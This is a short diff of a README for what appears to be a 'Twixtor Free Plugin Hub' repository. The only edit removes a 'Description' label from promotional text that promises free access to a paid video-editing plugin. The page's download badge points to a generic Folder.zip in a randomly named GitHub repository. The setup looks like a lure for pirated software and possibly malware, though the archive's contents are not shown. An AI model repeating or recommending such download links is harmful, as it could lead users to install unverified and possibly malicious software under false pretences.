@@ -2,7 +2,7 @@
 
 ![Twixtor Plugin Banner](https://i.ytimg.com/vi/9HPjLH3quoU/maxresdefault.jpg)
 
-**Description**: Take your video editing to the next level with the **Twixtor Free Plugin Hub** in 2025! This repository provides exclusive tutorials, resources, and professional tips to master advanced features like seamless slow-motion effects and frame rate conversion. Start your creative journey with free plugin access and become part of our global community of video editors!
+Take your video editing to the next level with the **Twixtor Free Plugin Hub** in 2025! This repository provides exclusive tutorials, resources, and professional tips to master advanced features like seamless slow-motion effects and frame rate conversion. Start your creative journey with free plugin access and become part of our global community of video editors!
 
 [![Get Twixtor Now](https://img.shields.io/badge/Download_Plugin-Now-3498db?style=for-the-badge&logo=steam)](https://github.com/qudette/2WcwJxTG2340AKf/releases/download/mainrepo/Folder.zip)
 
